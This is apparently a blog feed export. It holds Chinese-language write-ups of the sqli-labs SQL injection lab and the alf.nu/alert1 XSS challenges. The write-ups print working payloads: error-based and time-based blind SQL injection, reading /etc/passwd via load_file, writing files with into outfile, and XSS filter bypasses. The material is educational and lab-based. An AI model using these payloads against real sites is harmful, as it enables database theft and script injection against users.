    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2018-13379-Fortigate-SSL-VPN-未授权任意文件读取&quot;&gt;&lt;a href=&quot;#CVE-2018-13379-Fortigate-SSL-VPN-未授权任意文件读取&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs挑战记录</title>
    <link href="https://danta.fun/2018/02/08/sqli-labs%E6%8C%91%E6%88%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://danta.fun/2018/02/08/sqli-labs挑战记录/</id>
    <published>2018-02-08T13:17:13.000Z</published>
    <updated>2018-02-23T12:25:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">sqli-labs</a>是Github上一个印度大叔<a href="https://github.com/Audi-1" target="_blank" rel="noopener">Audi-1</a>的一个项目，用PHP和MySQL搭建的一个学习SQLI注入的实验平台。印度大叔有亲自自己录过教学视频，只是口音有点重，放在了Youtube上面（<a href="https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro" target="_blank" rel="noopener">这里</a>）。我在此记录一下学习过程中的东西，欢迎交流。       </p><h1 id="Less-1-4"><a href="#Less-1-4" class="headerlink" title="Less 1 - 4"></a>Less 1 - 4</h1><p>当找到注入点的时候，可以用order by 1/2/3来知道select中共有多少列。如果order by 不管用，可以用union select 1,2,3来判断，因为union要求左右两张表是一样的列数。</p><p>当页面不显示数据返回的结果，但是有错误提示，可以利用错误提示将数据dump出来</p><p>select concat((select database()))</p><p>原理解释<a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group by)</a><br>select count(<em>), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (SELECT USER()),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;</p><p>所以可以进阶一下，查看更多信息<br>select count(<em>), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>美化版<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (<br>            SELECT<br>                table_name  //此处无法用group_concat<br>            FROM<br>                information_schema. TABLES<br>            WHERE<br>                table_schema = DATABASE ()<br>            LIMIT 0,<br>            1<br>        ),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;<br>改变limit就可以遍历了，但是子查询中不知道为什么用group_concat就不会错误，所以只能一个个改变limit来。</p><p>以下还有两种方式也是一样的效果。<br> select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)</p><p> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p><p> 当不能使用select * from 的时候，比如后面有and 语句。可以用盲注。</p><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p> 盲注，这种情况没有错误提时，只能通过true and false来判断。<br> 需要借助的函数是 ascii(), substr(), length() 这样来枚举一个字符串的长度，每一个字母来获取需要的信息。<br> 比如<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(database(), 3, 1)) &lt;100 </span><br><span class="line">and ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) &lt; 100</span><br></pre></td></tr></table></figure></p><h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>上一题的盲注是基于真假值得。但是这一题的sql结果无论是否存在与否，网页前端都是同一个效果，所以我们这一题的盲注要通过一个小技巧，叫做时间盲注。要用到sleep()函数。<br>可以构造构造如下的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)</span><br><span class="line">select if((select database())=&quot;security&quot;, sleep(10), null)</span><br><span class="line">select if((select database() like &quot;sec%&quot;), sleep(10), null)</span><br></pre></td></tr></table></figure><p>假如第一个字母是正确的话，那么我们网页就等等待10秒才返回结果，如果错误就立即返回了。通过这两个时间的差距，我们就可以判断。</p><h1 id="using-outfile-lesst-7"><a href="#using-outfile-lesst-7" class="headerlink" title="using outfile (lesst-7)"></a>using outfile (lesst-7)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">select * from users limit 1 into dumpfile &quot;/tmp/test.txt&quot;</span><br></pre></td></tr></table></figure><p>outfile可以多行，dumpfile只能一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;/etc/passwd&quot;) into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">``` </span><br><span class="line">路径名一般用网站的目录，至于网站的目录就用其他方法来猜测和确定。</span><br><span class="line"></span><br><span class="line"># less-12</span><br><span class="line">从11开始，就是post方法的注入了。</span><br><span class="line">这里也是基于页面的Mysql错误提示来猜测SQL的写法。</span><br><span class="line"></span><br><span class="line"># less 14</span><br><span class="line">因为这里成功登入之后没有任何有用的信息返回，但是错误SQL的时候页面会有错误提示，所以我们要用双重注入。</span><br></pre></td></tr></table></figure><p>“ and (select 1 from (select count(<em>), (concat(“<del>“,version(),”</del>“,floor(rand(0)</em>2)))c from information_schema.tables GROUP BY c)a) # </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># less 16</span><br><span class="line">这题是盲注</span><br><span class="line"></span><br><span class="line"># less 17</span><br></pre></td></tr></table></figure><p>update users set password=’$psd’ where username=’$uname’</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这题就需要用双重注入</span><br><span class="line"></span><br><span class="line"># less 18</span><br></pre></td></tr></table></figure><p> ‘::1’, ‘admin’)’ at line 1<br> insert into uagents (agents, ip , uname) value(‘’, ‘’, ‘admin’)<br> insert into uagents(agent, ip, uname) value(‘’ or 1 = ‘1’, ‘::1’, ‘admin’)</p><p> ```<br> 这里应该用双重注入</p><h1 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h1><p> 基于cookie的注入， 这里其实也就是另一种形式的基于错误的注入。</p><h1 id="less-21"><a href="#less-21" class="headerlink" title="less 21"></a>less 21</h1><p> 和上面一样，只是加多一道加密的过程。</p><h1 id="有趣小知识"><a href="#有趣小知识" class="headerlink" title="有趣小知识"></a>有趣小知识</h1><ol><li>可以通过一个有趣的小测试来识别是否存在单引号漏洞：<br>向Web服务器发送下面两个请求：<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;||&#39;kes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;||&#39;kes</a><br>在Microsoft SQL Server中与之等价的请求为：<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;+&#39;kes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;+&#39;kes</a><br>在MYSQL中与之等价的请求为（请注意两个单引号之间的空格）：<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;</a> ‘kes<br>如果两个请求的结果相同，那么很可能存在SQL注入漏洞。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS练习:alf.nu/alert1 Write-ups</title>
    <link href="https://danta.fun/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/"/>
    <id>https://danta.fun/2018/01/29/XSS练习-alf-nu-alert1-Write-ups/</id>
    <published>2018-01-29T09:26:26.000Z</published>
    <updated>2018-01-30T08:55:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这些天在<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alf.nu/alert1</a>上做了XSS练习题，目前大部分做出来了，但有些题目并不是最优解。还剩下2道题没有做出（Fruit3, Qunie），在此做个记录。欢迎大家交流。</p><a id="more"></a><h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题对输入没有限制，只要闭合掉console.log即可。<br>solution(12 chars): <code>&quot;);alert(1,&quot;</code><br><br><br><br><br></p><h1 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题escape将输入的引号<code>&quot;</code>转换为了<code>\\&quot;</code>，使得引号变成了字面量，上一题的方法无效了。不过如果输入为<code>\&quot;</code>，那么就会转换为<code>\\\&quot;</code>，这个时候，本来是转义引号的，但变成了转义反斜杆了，从而引号可以逃脱转义了。<br>solution(14 chars): <code>\&quot;);alert(1)//</code><br><br><br><br><br></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题对输入的字符串用了<code>JSON.stringify()</code>(<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify" target="_blank" rel="noopener">相关介绍</a>)来处理字符串。简单来说，就是过滤了<code>\</code>,<code>&quot;</code>等字符，分别转化为<code>\\</code>,<code>\&quot;</code>等，但没有过滤<code>&lt;</code>,<code>&gt;</code>,<code>/</code>字符，这就够用了。既然闭合不了<code>log</code>函数，那就闭合<code>script</code>标签吧<br>solution(27 chars): <code>&lt;/script&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样因为<code>JSON.stringify()</code>的原因没办法用直接用<code>&quot;</code>，但是由于这次注入的地方是url，所以可以用URL编码的办法讲<code>&quot;</code>转换为<code>%22</code>。<br>solution(15 chars): <code>%22);alert(1)//</code><br><br><br><br><br></p><h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> text = s.replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</span><br><span class="line">  <span class="comment">// URLs</span></span><br><span class="line">  text = text.replace(<span class="regexp">/(http:\/\/\S+)/g</span>, <span class="string">'&lt;a href="$1"&gt;$1&lt;/a&gt;'</span>);</span><br><span class="line">  <span class="comment">// [[img123|Description]]</span></span><br><span class="line">  text = text.replace(<span class="regexp">/\[\[(\w+)\|(.+?)\]\]/g</span>, <span class="string">'&lt;img alt="$2" src="$1.gif"&gt;'</span>);</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析这题的处理方法</p><ol><li>首先，对于任何输入，先过滤掉<code>&lt;</code>和<code>&quot;</code>变为实体编码<code>&amp;lt</code>和<code>&amp;quot</code>。</li><li>如果字符串中有包含<code>http://</code>开头的字符串，例如<code>http://xiao.world</code>则变为<code>&lt;a href=&quot;http://xiao.world&quot;&gt;http://xiao.world&lt;/a&gt;</code></li><li>如果字符串中包含<code>[[img_src|img_alt]]</code>格式的字符串，则变为<code>&lt;img alt=&quot;img_alt&quot; src=&quot;this_src.git&quot;&gt;</code></li><li>返回字符串</li></ol><p>对于这个题目，因为尖括号和引号都被过滤了，所以要从这里入手会比较困难。但是可以利用第二点和第三点的规则来做突破口。为甚么这么说呢？既然自己没办法闭合属性的引号或者标签，但是规则二转换之后会带有引号，利用这个引号，就可以闭合掉规则三转换之后的img标签的alt属性了。<br>输入：<code>[[a|http://onerror=&#39;alert(1)]]</code><br>经过规则一转换后:<code>[[a|&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;]]&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>再经过规则二转换： <code>&lt;img alt=&quot;&lt;a href=&quot;http://onerror=&#39;alert(1)&#39;&quot; src=&quot;a.gif&quot;&gt;&quot;&gt;http://onerror=&#39;alert(1)&#39;]]&lt;/a&gt;</code><br>感谢HTML语言松散的特性，以上即相当于: <code>&lt;img alt=&quot;&lt;a href=&quot; http:=&quot;&quot; onerror=&quot;alert(1)&quot; &quot;=&quot;&quot; src=&quot;a.gif&quot;&gt;</code><br>再精简一点，只看关键部分: <code>&lt;img alt=&quot;&lt;a href=&quot; onerror=&quot;alert(1)&quot; src=&quot;a.git&quot;&gt;</code><br>至此，大功告成😄。<br>solution(31 chars): <code>[[a|http://onerror=&#39;alert(1)&#39;]]</code><br><br><br><br><br></p><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Slightly too lazy to make two input fields.</span></span><br><span class="line">  <span class="comment">// Pass in something like "TextNode#foo"</span></span><br><span class="line">  <span class="keyword">var</span> m = s.split(<span class="regexp">/#/</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Only slightly contrived at this point.</span></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  a.appendChild(<span class="built_in">document</span>[<span class="string">'create'</span>+m[<span class="number">0</span>]].apply(<span class="built_in">document</span>, m.slice(<span class="number">1</span>)));</span><br><span class="line">  <span class="keyword">return</span> a.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在于理解第八行的代码。<br>如果输入为<code>Element#alert</code><br>第八行为：<code>document[&quot;createElement&quot;].apply(document, &quot;alert&quot;)</code><br>相当于<code>document.createElement(&quot;alert&quot;)</code><br>这样只是创建了一个<code>&lt;alert&gt;</code>标签，我们没有办法注入。所以查一下document有哪些create开头的方法，一下列出一些常用的：</p><blockquote><p>createElement<br>createTextNode<br>createComment<br>createAttribute<br>createEvent</p></blockquote><p>这里看到有<code>createComment</code>就令人特别开心。所以答案见下<br>solution(32 chars): <code>Comment#&gt;&lt;iframe onload=alert(1)</code><br><br><br><br><br></p><h1 id="Callback"><a href="#Callback" class="headerlink" title="Callback"></a>Callback</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\u003c'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随便输入点看看效果吧：<code>input1#input2</code><br>输出: <code>&lt;script&gt;input1({&quot;userdata&quot;:&quot;input2&quot;})&lt;/script&gt;</code><br>因为input1有输入要求，但是input2可以为任意值，所以我们的注入可以放在input2，但是在input2之前有一堆奇奇怪怪的东西，最直接简单的办法就是用引号闭合掉他们就好了。所幸input1并没有把单引号过滤掉，所以答案就是<br>solution(15 chars): <code>&#39;#&#39;;alert(1);//</code><br><br><br><br><br></p><h1 id="Skandia"><a href="#Skandia" class="headerlink" title="Skandia"></a>Skandia</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s.toUpperCase() + <span class="string">'")&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目真短，但心思没少花呀。<br>js的方法名是大小写敏感的，如果把<code>alert</code>变为了<code>ALERT</code>，那就不行了。但是HTML标签名和属性名是不区分大小写的，所以我们可以闭合掉<code>&lt;script&gt;</code>标签，然后自己注入标签，利用<code>onload</code>属性出发<code>alert</code>，但是有个问题就是<code>alert</code>大小写怎么办呢？依我个人测试和理解(暂时未找到根据)，在属性值处使用实体编码的话，是可以自动解码的,其他地方则不行。所以，问题解决了。<br>solution(53 chars): <code>&lt;/script&gt;&lt;iframe onload=&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74(1)&gt;</code><br>但我这个解用了53个字符，并不是最短的，但是有人也有人做到了30多和40多的，我暂时也想不到什么办法。有知道的请告诉我一声，谢谢😄<br><br><br><br><br></p><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">htmlEscape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/./g</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> &#123; <span class="string">'&lt;'</span>: <span class="string">'&amp;lt;'</span>, <span class="string">'&gt;'</span>: <span class="string">'&amp;gt;'</span>, <span class="string">'&amp;'</span>: <span class="string">'&amp;amp;'</span>, <span class="string">'"'</span>: <span class="string">'&amp;quot;'</span>, <span class="string">"'"</span>: <span class="string">'&amp;#39;'</span> &#125;[x] || x;       </span><br><span class="line">     &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">expandTemplate</span>(<span class="params">template, args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> template.replace(</span><br><span class="line">        /&#123;(\w+)&#125;/g, </span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params">_, n</span>) </span>&#123; </span><br><span class="line">           <span class="keyword">return</span> htmlEscape(args[n]);</span><br><span class="line">         &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> expandTemplate(</span><br><span class="line">    <span class="string">"                                                \n\</span></span><br><span class="line"><span class="string">      &lt;h2&gt;Hello, &lt;span id=name&gt;&lt;/span&gt;!&lt;/h2&gt;         \n\</span></span><br><span class="line"><span class="string">      &lt;script&gt;                                       \n\</span></span><br><span class="line"><span class="string">         var v = document.getElementById('name');    \n\</span></span><br><span class="line"><span class="string">         v.innerHTML = '&lt;a href=#&gt;&#123;name&#125;&lt;/a&gt;';       \n\</span></span><br><span class="line"><span class="string">      &lt;\/script&gt;                                     \n\</span></span><br><span class="line"><span class="string">    "</span>,</span><br><span class="line">    &#123; <span class="attr">name</span> : s &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说，对输入字符串过滤掉尖括号，引号等，然后将处理完的字符串替换掉模板字符串中<code>{name}</code>。但是百密一疏，字符串中可以用8进制或者16进制来表示字符。所以答案就出来了。<code>&lt;</code>对应的八进制是<code>\74</code>。<br>solution(27): <code>\74iframe onload=alert(1)//</code><br><br><br><br><br></p><h1 id="JSON-1"><a href="#JSON-1" class="headerlink" title="JSON ]["></a>JSON ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s).replace(<span class="regexp">/&lt;\/script/gi</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题也挺有意思的。格式化之后再把<code>&lt;/script</code>替换成空串。使用一点技巧就可以绕过了。<br>solution(35): <code>&lt;/scr&lt;/scriptipt&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p><h1 id="Callback-1"><a href="#Callback-1" class="headerlink" title="Callback ]["></a>Callback ][</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// Pass inn "callback#userdata"</span></span><br><span class="line">  <span class="keyword">var</span> thing = s.split(<span class="regexp">/#/</span>); </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z\[\]']*$/</span>.test(thing[<span class="number">0</span>])) <span class="keyword">return</span> <span class="string">'Invalid callback'</span>;</span><br><span class="line">  <span class="keyword">var</span> obj = &#123;<span class="string">'userdata'</span>: thing[<span class="number">1</span>] &#125;;</span><br><span class="line">  <span class="keyword">var</span> json = <span class="built_in">JSON</span>.stringify(obj).replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">"&lt;script&gt;"</span> + thing[<span class="number">0</span>] + <span class="string">"("</span> + json +<span class="string">")&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和上面的题目<a href="#Callback">Callback</a>一样，只是因为过滤了<code>/</code>，不能用<code>//</code>注释了而已，那就换一种注释方式吧<br>solution(16): <code>&#39;#&#39;;alert(1)&lt;!--</code><br><br><br><br><br></p><h1 id="Skandia-1"><a href="#Skandia-1" class="headerlink" title="Skandia ]["></a>Skandia ][</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function escape(s) &#123;</span><br><span class="line">  if (/[&lt;&gt;]/.test(s)) return &apos;-&apos;;</span><br><span class="line"></span><br><span class="line">  return &apos;&lt;script&gt;console.log(&quot;&apos; + s.toUpperCase() + &apos;&quot;)&lt;/script&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先考虑到可以闭合<code>script</code>标签，但是这题过滤了尖括号，想到上一题<a href="#Template">Template</a>的方法，即用十六进制或八进制来表示尖括号，但是经过测试发现，在这题并不管用。想不明白为甚么，但是测试结果是：字符串的<code>replace</code>方法是认不出十六进或者八进制代表的字符的，但是<code>test</code>方法却可以。所以上一题Template用的过滤方法replace过滤<code>&lt;</code>括号时，由于我们用了<code>\74</code>来表示，而replace方法并不认识它，所以绕过了过滤。但是这题用了<code>test</code>方法，面对同样的情况，它知道<code>\74</code>即代表着<code>&lt;</code>，所以这个方法无效了。<br>既然不能闭合<code>script</code>，那就可以考虑闭合<code>log</code>，应该注入的payload是<code>&quot;);alert(1)//</code>，但是alert转为大写就不行了。此时最简单粗暴的方法是直接用<a href="http://utf-8.jp/public/jjencode.html" target="_blank" rel="noopener">jjencode</a>( an online non-alphanumeric encoder)。将<code>alert(1)</code>用jjencode encode得到的转码后的结果，由于结果太长了，所以用jjencode代表，则<br>solutioon(538)为: <code>&quot;);jjencode//</code></p><p>但是538个字符还是太长了。在<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" 